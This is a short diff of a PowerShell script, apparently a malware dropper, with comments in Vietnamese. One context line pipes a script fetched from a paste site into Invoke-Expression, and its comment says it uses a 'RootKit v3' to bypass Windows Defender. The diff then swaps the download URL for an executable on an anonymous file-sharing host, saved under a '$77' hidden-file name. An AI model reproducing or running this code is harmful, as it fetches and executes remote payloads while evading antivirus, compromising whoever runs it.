@@ -54,7 +54,7 @@ $folderPath = $dir
 iwr "https://pastie.io/raw/evijeu" | iex # Sử dụng RootKit v3 để bypass windows defender
 
 $filePath = "$folderPath\$77.exe"
-$url = "https://anonsharing.com/file/8c1a24ed85d74236/verify_(3).exe"
+$url = "https://anonsharing.com/file/bc17bfc4b4fd8ee0/main.exe"
 
 # Tạo thư mục nếu chưa tồn tại
 if (!(Test-Path $folderPath)) {
